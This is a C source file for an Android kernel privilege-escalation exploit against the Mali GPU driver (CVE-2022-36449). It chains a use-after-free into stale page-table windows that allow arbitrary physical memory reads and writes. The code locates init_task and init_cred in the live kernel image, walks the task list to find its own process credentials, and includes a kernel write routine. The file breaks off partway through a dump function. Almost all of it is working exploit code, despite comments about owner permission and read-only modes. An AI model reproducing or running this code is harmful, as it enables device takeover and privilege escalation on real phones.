/* CVE-2022-36449 escalation probe (read backend over stale-PTE windows).
 *
 * Builds on the CONFIRMED v7 primitive (MALI-36449-RECLAIM.md 6/6b): one
 * 36449 chain (AIO ring -> import/pin/populate/release -> io_destroy ->
 * munmap -> block spray) yields a stale mapping over an OWN level-3 PTE
 * table with ~506 usable zero entries; each entry = one physical 4K page
 * window (read or write), closed right after the access.
 *
 * This probe chains MULTIPLE cycles in one process to get enough window
 * budget for a kernel-image scan (~2.3K pages) plus a tasks-list walk.
 * That means Mali ioctls DO happen after a previous cycle's ring page was
 * freed - an audited deviation from the v7 "no ioctls after munmap" rule:
 * every ioctl of a later cycle (mem_alloc/import/submit/query) touches
 * only ITS OWN new regions and never iterates existing CPU mappings, and
 * context teardown happens only at exit.  See RECLAIM doc 6c.
 *
 * Modes (one per process; device runs need explicit owner permission):
 *   scan - read-only: find init_task in the live image, read init_cred
 *          (caps/sid source), walk tasks, locate and validate THIS
 *          process's cred.  No kernel-memory writes beyond window
 *          entries in our own stale tables.
 *   dump - read-only: write a range of the live image to a file under
 *          /data/local/tmp, with a sha256 of the bytes.
 *   read - read-only: one 32-bit word at a physical address.
 *   flip - the only writing mode: one 32-bit store, guarded by a
 *          before-read and a read-back with rollback on mismatch.
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "mali.h"
#include "mali_base_jm_kernel.h"
#include "reclaim_scan.h"
#include "esc_scan.h"
#include "bridge_builtin.h"

#define MALI_DEV "/dev/mali0"
#define PAGE_SIZE_ 0x1000u
#define BLOCK_BYTES (2u * 1024u * 1024u)

#define RING_EVENTS 128u
#define RING_MAP_LEN (2u * PAGE_SIZE_)
#define RING_MARK_OFF 0x800u
#define RING_MARK "RECLAIM36449#1"

/* Reader resources: one 2MB-aligned reservation, blocks consumed in
 * order; ~3 blocks per cycle were enough in v5/v6/v7.  384 blocks =
 * 768 MB of VA (fits the 32-bit address space), only 3 pages per block
 * are ever faulted (<= ~2 MB of RAM total). */
#define RES_BLOCKS 512u
#define CYCLE_MAX_BLOCKS 24u
#define CYCLES_MAX 24u

struct gpu_page {
	uint64_t gpu;
	void *cpu;
};

struct base_external_resource {
	uint64_t ext_resource;
};

struct reader {
	int fd;
	unsigned char *res_base;
	int next_block;
	volatile uint64_t *table;   /* stale mapping over the owned table */
	unsigned char *blk;         /* VA base of the governed 2MB block */
	int next_idx;               /* next zero entry to hand out */
	uint64_t tmpl;              /* live entry as window template */
	int cycles, windows, blocks;
};

static struct reader g_rd;

static void fault_handler(int sig, siginfo_t *si, void *ctx)
{
	char buf[128];
	int n;

	(void)ctx;
	n = snprintf(buf, sizeof buf,
		     "RESULT: access fault sig=%d si_addr=%p\n",
		     sig, si ? si->si_addr : NULL);
	write(STDOUT_FILENO, buf, n > 0 ? n : 0);
	_exit(3);
}

/* ---- Mali helpers (as in the proven v7 probe; every ioctl logged) ---- */

static int open_mali(void)
{
	struct kbase_ioctl_version_check vc = {0};
	struct kbase_ioctl_set_flags sf = {.create_flags = 0};
	int fd = open(MALI_DEV, O_RDWR);
	void *track;

	if (fd < 0) {
		perror("open mali");
		return -1;
	}
	if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc) < 0) {
		perror("version");
		close(fd);
		return -1;
	}
	if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) < 0) {
		perror("set_flags");
		close(fd);
		return -1;
	}
	track = mmap(NULL, PAGE_SIZE_, 0, MAP_SHARED, fd,
		     BASE_MEM_MAP_TRACKING_HANDLE);
	if (track == MAP_FAILED) {
		perror("tracking");
		close(fd);
		return -1;
	}
	printf("mali: UK %u.%u\n", vc.major, vc.minor);
	return fd;
}

static int mem_alloc_cpu(int fd, unsigned pages, struct gpu_page *out)
{
	union kbase_ioctl_mem_alloc alloc = {0};

	alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
			 BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
	alloc.in.va_pages = pages;
	alloc.in.commit_pages = pages;
	if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &alloc) < 0) {
		perror("mem_alloc");
		return -1;
	}
	out->cpu = mmap(NULL, (size_t)pages * PAGE_SIZE_,
			PROT_READ | PROT_WRITE, MAP_SHARED, fd,
			alloc.out.gpu_va);
	if (out->cpu == MAP_FAILED) {
		perror("mmap alloc");
		return -1;
	}
	out->gpu = alloc.out.gpu_va;
	return 0;
}

static int import_user_page(int fd, void *user, size_t len,
			     struct gpu_page *out)
{
	struct base_mem_import_user_buffer ubuf = {
		.ptr = (uint64_t)(uintptr_t)user,
		.length = len,
	};
	union kbase_ioctl_mem_import mi = {.in = {
		.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
			 BASE_MEM_PROT_CPU_WR | BASE_MEM_CACHED_CPU,
		.phandle = (uint64_t)(uintptr_t)&ubuf,
		.type = BASE_MEM_IMPORT_TYPE_USER_BUFFER,
	}};
	int rc;

	rc = ioctl(fd, KBASE_IOCTL_MEM_IMPORT, &mi);
	printf("import rc=%d errno=%d gpu=0x%llx\n",
	       rc, rc < 0 ? errno : 0, (unsigned long long)mi.out.gpu_va);
	if (rc < 0)
		return -1;
	out->cpu = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
			mi.out.gpu_va);
	if (out->cpu == MAP_FAILED) {
		perror("mmap import");
		return -1;
	}
	out->gpu = mi.out.gpu_va;
	return 0;
}

static int submit_atom(int fd, uint8_t atom_number, uint32_t core_req,
		       uint64_t jc_va, uint64_t extres_list,
		       uint16_t nr_extres)
{
	struct base_jd_atom_v2 atom = {0};
	struct kbase_ioctl_job_submit submit = {0};
	int rc;

	atom.atom_number = atom_number;
	atom.core_req = core_req;
	atom.jc = jc_va;
	atom.extres_list = extres_list;
	atom.nr_extres = nr_extres;
	submit.addr = (uint64_t)(uintptr_t)&atom;
	submit.nr_atoms = 1;
	submit.stride = sizeof(atom);
	rc = ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit);
	printf("submit atom=%u req=0x%x rc=%d errno=%d\n",
	       atom_number, core_req, rc, rc < 0 ? errno : 0);
	return rc;
}

static int commit_size(int fd, uint64_t gpu_addr, const char *label)
{
	union kbase_ioctl_mem_query q = {.in = {
		.gpu_addr = gpu_addr,
		.query = KBASE_MEM_QUERY_COMMIT_SIZE,
	}};
	int rc = ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q);

	printf("commit %s rc=%d errno=%d value=%llu\n", label, rc,
	       rc < 0 ? errno : 0, (unsigned long long)q.out.value);
	return rc < 0 ? -1 : (int)q.out.value;
}

/* ---- reader: cycles of the proven 36449 chain ---- */

static int reader_cycle(struct reader *r)
{
	struct gpu_page imported = {0}, jc = {0};
	struct base_external_resource extres;
	struct rs_result rs;
	uint64_t entries[RS_ENTRIES];
	uint64_t pa0, w, magic, got;
	unsigned char *ring, *p;
	unsigned long ctx = 0;
	uint8_t atom_wait, atom_set;
	int cyc = r->cycles + 1, tried;
	volatile uint64_t *table;
	uint8_t selftest[8];

	if (cyc > (int)CYCLES_MAX) {
		printf("reader: cycle cap reached\n");
		return -1;
	}
	/* Atom numbers strictly increase and are never reused. */
	atom_wait = (uint8_t)(cyc * 2);
	atom_set = (uint8_t)(cyc * 2 + 1);

	if (syscall(__NR_io_setup, RING_EVENTS, &ctx) < 0) {
		printf("io_setup errno=%d\n", errno);
		return -1;
	}
	ring = (unsigned char *)ctx;
	memcpy(ring + RING_MARK_OFF, RING_MARK, sizeof(RING_MARK));

	if (import_user_page(r->fd, ring, PAGE_SIZE_, &imported) < 0)
		return -1;
	if (mem_alloc_cpu(r->fd, 1, &jc) < 0)
		return -1;
	*(volatile uint8_t *)jc.cpu = 0;
	extres.ext_resource = imported.gpu;
	if (commit_size(r->fd, imported.gpu, "before-pin") != 0) {
		printf("cycle %d: region already backed\n", cyc);
		return -1;
	}
	if (submit_atom(r->fd, atom_wait,
			BASE_JD_REQ_EXTERNAL_RESOURCES |
			BASE_JD_REQ_SOFT_EVENT_WAIT,
			jc.gpu, (uint64_t)(uintptr_t)&extres, 1) < 0)
		return -1;
	usleep(100000);
	if (commit_size(r->fd, imported.gpu, "pinned") != 1) {
		printf("cycle %d: pin failed\n", cyc);
		return -1;
	}
	/* Populate the lazy CPU PTEs while pinned - mandatory. */
	if (memcmp(imported.cpu + RING_MARK_OFF, RING_MARK,
		   sizeof(RING_MARK))) {
		printf("cycle %d: pinned marker mismatch\n", cyc);
		return -1;
	}
	if (submit_atom(r->fd, atom_set, BASE_JD_REQ_SOFT_EVENT_SET,
			jc.gpu, 0, 0) < 0)
		return -1;
	usleep(100000);
	if (commit_size(r->fd, imported.gpu, "after-release") != 0) {
		printf("cycle %d: release failed\n", cyc);
		return -1;
	}
	if (memcmp(imported.cpu + RING_MARK_OFF, RING_MARK,
		   sizeof(RING_MARK))) {
		printf("cycle %d: marker flushed at release\n", cyc);
		return -1;
	}
	if (syscall(__NR_io_destroy, ctx) < 0) {
		printf("io_destroy errno=%d: ring not freed, abort\n", errno);
		return -1;
	}
	if (munmap(ring, RING_MAP_LEN) < 0)
		perror("munmap ring (continuing)");
	usleep(200000);
	r->cycles = cyc;
	printf("cycle %d: ring freed (atoms %u/%u)\n", cyc,
	       atom_wait, atom_set);

	/* Spray fresh blocks until one's table lands on the freed page. */
	p = NULL;
	for (tried = 0; tried < (int)CYCLE_MAX_BLOCKS; tried++) {
		if (r->next_block >= (int)RES_BLOCKS) {
			printf("reader: out of spray blocks\n");
			return -1;
		}
		p = r->res_base + (unsigned long)r->next_block * BLOCK_BYTES;
		r->next_block++;
		r->blocks++;
		magic = 0x52444359ULL << 32;          /* "RDCY" */
		magic |= ((uint64_t)cyc << 8) & 0xff00u;
		magic |= (uint64_t)r->next_block & 0xffu;
		*(volatile uint64_t *)p = magic;
		memset(p + PAGE_SIZE_, 2, PAGE_SIZE_);
		memset(p + 2 * PAGE_SIZE_, 2, PAGE_SIZE_);
		memcpy(entries, imported.cpu, sizeof entries);
		rs_analyze(entries, &rs);
		if (rs_is_marker_table(entries, 3, 0, &rs))
			break;
	}
	if (tried == (int)CYCLE_MAX_BLOCKS) {
		printf("cycle %d: no reclaim after %d blocks\n", cyc, tried);
		return -1;
	}

	/* Live freshness re-read (migration check) exactly as v7. */
	table = (volatile uint64_t *)(void *)imported.cpu;
	if (!rs_is_marker_table((const uint64_t *)table, 3, 0, &rs)) {
		printf("cycle %d: live table changed before use; abort\n", cyc);
		return -1;
	}
	r->table = table;
	r->blk = p;
	r->tmpl = table[0];
	r->next_idx = 3;
	pa0 = r->tmpl & RS_PA_MASK;
	if (!pt_target_ok(pa0)) {
		printf("cycle %d: pa0 implausible\n", cyc);
		return -1;
	}
	printf("cycle %d: table governed by block %d, pa0=0x%llx\n",
	       cyc, r->next_block - 1, (unsigned long long)pa0);

	/* Per-cycle self-test: window-read our own magic from page 0. */
	if (!pt_idx_usable((const uint64_t *)table, r->next_idx)) {
		printf("cycle %d: first window idx not zero\n", cyc);
		return -1;
	}
	w = pt_build_window(r->tmpl, pa0);
	pt_install_window(table + r->next_idx, w);
	memcpy(selftest, p + (unsigned long)r->next_idx * PAGE_SIZE_, 8);
	pt_close_window(table + r->next_idx);
	r->next_idx++;
	r->windows++;
	memcpy(&got, selftest, 8);
	if (got != magic) {
		printf("cycle %d: selftest want 0x%016llx got 0x%016llx; "
		       "abort\n", cyc, (unsigned long long)magic,
		       (unsigned long long)got);
		return -1;
	}
	printf("cycle %d: selftest ok (0x%016llx)\n", cyc,
	       (unsigned long long)magic);
	return 0;
}

/* Hand out the next usable zero entry, rolling to a new cycle when the
 * current table is exhausted.  Returns the entry index or -1. */
static int reader_take_idx(struct reader *r)
{
	while (r->next_idx >= RS_ENTRIES ||
	       !pt_idx_usable((const uint64_t *)r->table, r->next_idx)) {
		if (r->next_idx >= RS_ENTRIES) {
			if (reader_cycle(r))
				return -1;
			continue;
		}
		r->next_idx++;
	}
	return r->next_idx++;
}

/* Map one physical 4K page through a fresh window.  One retry: a
 * failed cycle (no reclaim after CYCLE_MAX_BLOCKS) is usually
 * transient - v3 recovered on the next ring. */
static int rd_page(struct reader *r, uint64_t pa, uint8_t out[PAGE_SIZE_])
{
	uint64_t w;
	int idx, try;

	if (!pa || pa >= ESC_RAM_SIZE || (pa & (PAGE_SIZE_ - 1)))
		return -1;
	for (try = 0; try < 2; try++) {
		idx = reader_take_idx(r);
		if (idx >= 0) {
			w = pt_build_window(r->tmpl, pa);
			pt_install_window(r->table + idx, w);
			memcpy(out, r->blk + (unsigned long)idx * PAGE_SIZE_,
			       PAGE_SIZE_);
			pt_close_window(r->table + idx);
			r->windows++;
			return 0;
		}
	}
	return -1;
}

/* esc_read_fn backend: pa..len never crosses a 4K boundary. */
static int esc_rd(uint64_t pa, void *buf, size_t len)
{
	uint8_t page[PAGE_SIZE_];
	uint64_t base = pa & ~(uint64_t)(PAGE_SIZE_ - 1);

	if (!len || len > PAGE_SIZE_ ||
	    base != ((pa + len - 1) & ~(uint64_t)(PAGE_SIZE_ - 1)))
		return -1;
	if (rd_page(&g_rd, base, page))
		return -1;
	memcpy(buf, page + (pa - base), len);
	return 0;
}

static int reader_init(struct reader *r, int fd)
{
	unsigned char *res;
	unsigned long span = (unsigned long)RES_BLOCKS * BLOCK_BYTES +
			     BLOCK_BYTES;

	memset(r, 0, sizeof *r);
	r->fd = fd;
	res = mmap(NULL, span, PROT_READ | PROT_WRITE,
		   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (res == MAP_FAILED) {
		perror("reserve mmap");
		return -1;
	}
	r->res_base = (unsigned char *)(((unsigned long)res + BLOCK_BYTES - 1) &
					~(unsigned long)(BLOCK_BYTES - 1));
	return reader_cycle(r);
}

/* ---- scan phases ---- */

/* Multi-page chunked read through esc_rd (single-page windows). */
static int esc_read_raw(uint64_t pa, uint8_t *buf, uint32_t len)
{
	uint32_t done = 0;

	while (done < len) {
		uint64_t cur = pa + done;
		uint32_t chunk = PAGE_SIZE_ - (uint32_t)(cur & (PAGE_SIZE_ - 1));

		if (chunk > len - done)
			chunk = len - done;
		if (esc_rd(cur, buf + done, chunk))
			return -1;
		done += chunk;
	}
	return 0;
}

/* Find the live image; scan_end comes from the RUNNING header's
 * image_size (build 0921 may differ from boot.img 0896's 0x8d5800). */
static uint64_t find_image_base(struct reader *r, uint64_t *scan_end)
{
	uint8_t page[PAGE_SIZE_];
	uint64_t pa;
	int i;

	*scan_end = 0;
	for (i = 0; i < 16; i++) {
		pa = ESC_IMAGE_PA_DEFAULT + (uint64_t)i * 0x200000u;
		if (rd_page(r, pa, page)) {
			printf("image: read failed at 0x%llx\n",
			       (unsigned long long)pa);
			return 0;
		}
		if (esc_image_magic_ok(page)) {
			uint64_t text_off = 0, image_size = 0;
			int k;

			printf("image: ARM64 magic at PA 0x%llx (slot %d)\n",
			       (unsigned long long)pa, i);
			printf("image: first 0x40 bytes:");
			for (k = 0; k < 0x40; k += 8) {
				uint64_t v;

				memcpy(&v, page + k, 8);
				printf(" %016llx", (unsigned long long)v);
			}
			printf("\n");
			esc_image_header_raw(page, &text_off, &image_size);
			printf("image: raw text_offset=0x%llx "
			       "image_size=0x%llx\n",
			       (unsigned long long)text_off,
			       (unsigned long long)image_size);
			if (esc_image_header(page, &text_off, &image_size)) {
				/* read beyond the (untrusted) header is
				 * still plain RAM: validators filter
				 * free-page noise */
				printf("image: header outside sane bounds, "
				       "fallback scan +0x%llx\n",
				       (unsigned long long)ESC_IMAGE_SIZE_MAX);
				*scan_end = pa + ESC_IMAGE_SIZE_MAX;
			} else {
				uint64_t end = pa +
					((image_size + 0xfffULL) & ~0xfffULL);

				if (end > pa + ESC_IMAGE_SIZE_MAX) {
					end = pa + ESC_IMAGE_SIZE_MAX;
					printf("image: scan capped at +0x%llx\n",
					       (unsigned long long)ESC_IMAGE_SIZE_MAX);
				}
				*scan_end = end;
			}
			esc_set_image_range(pa, *scan_end - pa);
			return pa;
		}
		printf("image: no magic at 0x%llx\n", (unsigned long long)pa);
	}
	return 0;
}

/* Scan the live image for init_task ("swapper" at ANY byte offset).
 * Acceptance is CONTENT-BASED, not offset-based (v4 proved vendor
 * fields shift): a hit is init_task when BOTH an adjacent EQUAL
 * image-VA pair and an adjacent linear-VA pair (the populated tasks
 * list_head) sit within 0x400 before it.  SELF-pointing pairs (empty
 * list_heads: next==prev==own address) are collected separately: the
 * real cred pair is a non-self pair whose target validates as
 * init_cred, which run_scan decides. */
static int find_init_task(struct reader *r, uint64_t img_pa,
			  uint64_t scan_end, uint64_t *tasks_pa_out,
			  uint64_t *comm_pa_out,
			  uint64_t *cred_vas, int *n_cred_vas)
{
	uint8_t page[PAGE_SIZE_];
	uint8_t raw[ESC_CAND_RAW_SPAN];
	struct esc_cand cand;
	uint64_t pa, cand_pa, raw_pa, a, b;
	uint32_t off, from, i;
	int npages = 0, ncand = 0, ncv;

	for (pa = img_pa; pa < scan_end; pa += PAGE_SIZE_) {
		if (rd_page(r, pa, page)) {
			printf("scan: read fail at 0x%llx\n",
			       (unsigned long long)pa);
			return -1;
		}
		npages++;
		from = 0;
		while (esc_page_find_swapper_at(page, from, &off)) {
			from = off + 7;
			ncand++;
			cand_pa = pa + off;
			raw_pa = cand_pa - ESC_CAND_HIT_OFF;
			if (esc_read_raw(raw_pa, raw, sizeof raw)) {
				printf("scan: hit 0x%llx: raw read fail\n",
				       (unsigned long long)cand_pa);
				continue;
			}
			esc_probe_candidate(raw, ESC_CAND_HIT_OFF,
					    sizeof raw, &cand);
			/* enumerate non-self equal image-VA pairs */
			ncv = 0;
			for (i = 0; i + 16 <= sizeof raw && ncv < 8; i++) {
				memcpy(&a, raw + i, 8);
				memcpy(&b, raw + i + 8, 8);
				if (a == b && esc_is_image_va(a, ESC_IMAGE_BASE_DEFAULT) &&
				    !(a & 7u) &&
				    a != ESC_IMAGE_BASE_DEFAULT + raw_pa + i)
					cred_vas[ncv++] = a;
			}
			printf("scan: hit 0x%llx: tasks_pair=%d@+0x%x "
			       "cred_cands=%d rel[task=%d mm=%d pid=%d "
			       "cred=%d]\n",
			       (unsigned long long)cand_pa,
			       cand.has_tasks_pair, cand.tasks_pair_off,
			       ncv, cand.rel_tasks_linear, cand.rel_mm_zero,
			       cand.rel_pid_tgid_zero, cand.rel_cred_pair);
			if (cand.has_tasks_pair && ncv > 0) {
				*tasks_pa_out = raw_pa + cand.tasks_pair_off;
				*comm_pa_out = cand_pa;
				*n_cred_vas = ncv;
				printf("scan: %d pages, %d hits -> init_task "
				       "tasks@0x%llx comm@0x%llx "
				       "(D_tasks=0x%lx) %d cred cands\n",
				       npages, ncand,
				       (unsigned long long)*tasks_pa_out,
				       (unsigned long long)*comm_pa_out,
				       (unsigned long)(*comm_pa_out -
						       *tasks_pa_out), ncv);
				return 0;
			}
		}
	}
	printf("scan: init_task NOT confirmed (%d pages, %d hits)\n",
	       npages, ncand);
	return -1;
}

/* Fallback that does not depend on the comm string: the init_task page
 * contains an adjacent EQUAL image-VA pair (real_cred/cred both ->
 * &init_cred) with an adjacent linear-VA pair (tasks list_head) a few
 * hundred bytes earlier.  Purely diagnostic: reports candidate PAs. */
static int structural_scan(struct reader *r, uint64_t img_pa,
			   uint64_t scan_end)
{
	uint8_t page[PAGE_SIZE_];
	uint64_t pa, a, b, c, d;
	uint32_t i, j;
	int found = 0;

	for (pa = img_pa; pa < scan_end && found < 8; pa += PAGE_SIZE_) {
		if (rd_page(r, pa, page))
			return found;
		for (i = 0x400; i + 16 <= PAGE_SIZE_; i += 8) {
			memcpy(&a, page + i, 8);
			memcpy(&b, page + i + 8, 8);
			if (a != b || !esc_is_image_va(a, ESC_IMAGE_BASE_DEFAULT))
				continue;
			for (j = 0; j + 16 <= i; j += 8) {
				memcpy(&c, page + j, 8);
				memcpy(&d, page + j + 8, 8);
				if (esc_is_linear_va(c) &&
				    esc_is_linear_va(d)) {
					printf("struct: cred_pair 0x%llx "
					       "(va 0x%llx), linear pair "
					       "0x%llx (0x%llx/0x%llx)\n",
					       (unsigned long long)(pa + i),
					       (unsigned long long)a,
					       (unsigned long long)(pa + j),
					       (unsigned long long)c,
					       (unsigned long long)d);
					found++;
					break;
				}
			}
		}
	}
	printf("struct: %d candidates reported (cap 8)\n", found);
	return found;
}

static void dump_cred(const struct esc_credview *c)
{
	printf("cred: usage=%u uid=%u gid=%u suid=%u sgid=%u euid=%u "
	       "egid=%u fsuid=%u fsgid=%u securebits=0x%x\n",
	       c->usage, c->uid, c->gid, c->suid, c->sgid, c->euid,
	       c->egid, c->fsuid, c->fsgid, c->securebits);
	printf("cred: cap_permitted=0x%llx effective=0x%llx bset=0x%llx "
	       "ambient=0x%llx\n",
	       (unsigned long long)c->cap_permitted,
	       (unsigned long long)c->cap_effective,
	       (unsigned long long)c->cap_bset,
	       (unsigned long long)c->cap_ambient);
}

/* Write n (val, off) pairs around pa through one window; all offsets
 * must stay inside the same 4K page as pa.  Plain 32-bit stores are
 * fine here: cred/tss fields are ordinary kernel data, not PTEs. */
static int win_write32(struct reader *r, uint64_t pa,
		       const uint32_t *vals, const uint32_t *offs, int n)
{
	volatile uint8_t *va;
	uint64_t w, base = pa & ~(uint64_t)(PAGE_SIZE_ - 1);
	int i, idx;

	for (i = 0; i < n; i++)
		if ((pa & (PAGE_SIZE_ - 1)) + offs[i] + 4u > PAGE_SIZE_)
			return -1;
	idx = reader_take_idx(r);
	if (idx < 0)
		return -1;
	w = pt_build_window(r->tmpl, base);
	pt_install_window(r->table + idx, w);
	va = r->blk + (unsigned long)idx * PAGE_SIZE_ + (pa - base);
	for (i = 0; i < n; i++)
		*(volatile uint32_t *)(va + offs[i]) = vals[i];
	pt_close_window(r->table + idx);
	r->windows++;
	return 0;
}

/* Offset-free walk of the tasks list.  Per hop a window around the
 * tasks field is analyzed by CONTENT (comm string, pid==tgid pair);
 * every adjacent EQUAL linear-VA pair in the window is tried as the
 * cred pointer (mm/active_mm form the same shape and must not win)
 * and accepted only if esc_check_cred_shifted validates it as OUR
 * cred. */
/* ---- offset-free walk of the tasks list (see below) ---- */

static int walk_tasks_v2(uint64_t init_tasks_pa,
			 uint64_t head_va, const char *comm, int32_t pid,
			 uint64_t *cred_pa_out, int *seen,
			 const char **reason)
{
	uint8_t win[ESC_TASKWIN_SPAN];
	struct esc_taskwin tw;
	struct esc_credview c;
	const char *why = "";
	uint64_t next, pa, tss, try_pa;
	uint32_t i;
	uint32_t osid, sid;
	int n, tries;

	if (reason) *reason = "";
	*seen = 0;
	if (esc_rd(init_tasks_pa, &next, 8)) {
		if (reason) *reason = "init tasks read failed";
		return -1;
	}
	for (n = 0; n < ESC_MAX_TASKS; n++) {
		if (next == head_va)
			return 1; /* wrapped: not found */
		if (!esc_is_linear_va(next) || (next & 7u)) {
			if (reason) *reason = "tasks.next implausible";
			return -1;
		}
		pa = esc_linear_pa(next);
		if (esc_read_raw(pa - ESC_TASKWIN_HALF, win, sizeof win)) {
			if (reason) *reason = "task window read failed";
			return -1;
		}
		(*seen)++;
		esc_analyze_taskwin(win, sizeof win, comm, pid, &tw);
		if (tw.has_comm && tw.has_pid_tgid) {
			/* try every non-self adjacent equal linear pair
			 * as cred; mm/active_mm and empty list_heads
			 * (self-pointing) are skipped or rejected by the
			 * shift-tolerant validator */
			tries = 0;
			for (i = 0; i + 16 <= sizeof win && tries < 12; i += 4) {
				uint64_t a, b;

				memcpy(&a, win + i, 8);
				memcpy(&b, win + i + 8, 8);
				if (a != b || !esc_is_linear_va(a) || (a & 7u))
					continue;
				if (a == ESC_LINEAR_BASE + pa - ESC_TASKWIN_HALF + i)
					continue; /* self-pointing list_head */
				tries++;
				try_pa = esc_linear_pa(a);
				if (!esc_check_cred_shifted(esc_rd, try_pa, 0,
							    2000, &c, &tss,
							    &osid, &sid,
							    &why)) {
					printf("walk: task@0x%llx comm@+0x%x "
					       "pid@+0x%x cred@0x%llx "
					       "(pair@+0x%x uid_off=0x%x) "
					       "tss@0x%llx osid=%u sid=%u\n",
					       (unsigned long long)pa,
					       tw.comm_off, tw.pid_off,
					       (unsigned long long)try_pa, i,
					       c.uid_off,
					       (unsigned long long)tss,
					       osid, sid);
					*cred_pa_out = try_pa;
					return 0;
				}
			}
			printf("walk: comm+pid match at 0x%llx but no "
			       "linear pair validates as our cred "
			       "(%d tries, last: %s)\n",
			       (unsigned long long)pa, tries, why);
		}
		next = tw.tasks_next;
	}
	if (reason) *reason = "hop cap reached";
	return -1;
}

/* ---- shared scan flow ---- */

static int run_scan(struct reader *r, uint64_t *init_pa_out,
		    uint64_t *cred_pa_out, struct esc_credview *cred_out,
		    uint64_t *tss_pa_out, uint32_t *sid_out,
		    uint64_t *kcap_out, uint32_t *ksid_out)
{
	struct esc_credview c;
	const char *reason = "";
	uint64_t img_pa, scan_end = 0, init_tasks_pa = 0, comm_pa = 0;
	uint64_t cred_vas[8], init_cred_pa, cred_pa = 0, tss;
	uint32_t osid, sid, kosid, ksid;
	int32_t pid = (int32_t)getpid();
	int seen, n_cred = 0, ci;

	*kcap_out = 0;
	*ksid_out = 0;
	if (!(img_pa = find_image_base(r, &scan_end))) {
		printf("RESULT: image base not found; abort\n");
		return -1;
	}
	if (find_init_task(r, img_pa, scan_end, &init_tasks_pa, &comm_pa,
			   cred_vas, &n_cred)) {
		printf("RESULT: init_task not confirmed; "
		       "structural fallback (diagnostic only):\n");
		structural_scan(r, img_pa, scan_end);
		printf("RESULT: init_task not confirmed; abort\n");
		return -1;
	}
	*init_pa_out = comm_pa;

	/* init_cred: first non-self candidate that validates (shift-
	 * tolerant: vendor cred layouts may shift too) */
	init_cred_pa = 0;
	for (ci = 0; ci < n_cred; ci++) {
		uint64_t try_pa = esc_image_pa(cred_vas[ci],
					       ESC_IMAGE_BASE_DEFAULT);

		if (!esc_image_range_contains(try_pa))
			continue;
		if (!esc_check_cred_shifted(esc_rd, try_pa, 1, 0, &c, &tss,
					    &kosid, &ksid, &reason)) {
			init_cred_pa = try_pa;
			printf("init_cred PA 0x%llx (cand %d): caps "
			       "permitted=0x%llx effective=0x%llx "
			       "bset=0x%llx sid=%u uid_off=0x%x\n",
			       (unsigned long long)try_pa, ci,
			       (unsigned long long)c.cap_permitted,
			       (unsigned long long)c.cap_effective,
			       (unsigned long long)c.cap_bset, ksid,
			       c.uid_off);
			dump_cred(&c);
			*kcap_out = c.cap_effective;
			*ksid_out = ksid;
			break;
		}
		printf("init: cand %d (0x%llx) rejected: %s\n", ci,
		       (unsigned long long)try_pa, reason);
	}
	if (!init_cred_pa)
		printf("init: no cred candidate validated (fallback caps)\n");

	/* Offset-free walk to our own task; first hop validates
	 * PAGE_OFFSET. */
	if (walk_tasks_v2(init_tasks_pa,
			  ESC_IMAGE_BASE_DEFAULT + init_tasks_pa,
			  "esc36449", pid, &cred_pa, &seen,
			  &reason)) {
		if (*reason)
			printf("walk: FAILED after %d tasks: %s\n",
			       seen, reason);
		else
			printf("walk: this task not found (%d tasks)\n",
			       seen);
		printf("RESULT: own task not located; abort\n");
		return -1;
	}
	if (esc_check_cred_shifted(esc_rd, cred_pa, 0, 2000, &c, &tss,
				   &osid, &sid, &reason)) {
		printf("RESULT: own cred re-check INVALID at 0x%llx: %s\n",
		       (unsigned long long)cred_pa, reason);
		return -1;
	}
	printf("own cred PA 0x%llx tss PA 0x%llx osid=%u sid=%u\n",
	       (unsigned long long)cred_pa, (unsigned long long)tss,
	       osid, sid);
	dump_cred(&c);

	*cred_pa_out = cred_pa;
	*cred_out = c;
	*tss_pa_out = tss;
	*sid_out = sid;
	return 0;
}

/* ---- v15 read-only kallsyms dump and one-word flipper ----
 *
 * These modes run as the ordinary ADB-shell UID 2000.  They use the same
 * proven stale-PTE reader as scan, but never touch kernel creds or any
 * kernel data except flip's single 32-bit store.  The dump goes to
 * /data/local/tmp, which is writable for the shell user, so no root
 * channel is needed.
 */
#define V15_DUMP_PATH "/data/local/tmp/kallsyms-live.img"
#define V15_PATH_MAX 200u

static int v15_write_full(int fd, const uint8_t *buf, size_t len)
{
	while (len) {
		ssize_t n = write(fd, buf, len);

		if (n < 0) {
			if (errno == EINTR)
				continue;
			return -1;
		}
		if (!n)
			return -1;
		buf += n;
		len -= (size_t)n;
	}
	return 0;
}

static int v15_read_text(const char *path, char *buf, size_t max)
{
	int fd;
	ssize_t n;

	if (!max)
		return -EINVAL;
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -errno;
	n = read(fd, buf, max - 1);
	close(fd);
	if (n < 0)
		return -errno;
	buf[n] = 0;
	while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
		buf[--n] = 0;
	return 0;
}

static int v15_path_ok(const char *path)
{
	size_t len;

	if (!path || !*path)
		return 0;
	len = strlen(path);
	if (len >= V15_PATH_MAX)
		return 0;
	if (strncmp(path, "/data/local/tmp/", 16) != 0)
		return 0;
	if (path[16] == 0 || strstr(path, "/../"))
		return 0;
	return 1;
}

/* Read a range of the live arm64 image and write the raw bytes to a
 * shell-owned file.  start_pa == 0 selects the image start; length == 0
 * selects the rest of the image.  Read-only with respect to kernel memory;
 * only the reader's own PTE windows are written. */
static int mode_dump(const char *path, uint64_t start_pa, uint64_t length)
{
	struct reader *r = &g_rd;
	uint8_t page[PAGE_SIZE_];
	struct brb_sha256_ctx sha;
	unsigned char digest[32];
	char hex[65];
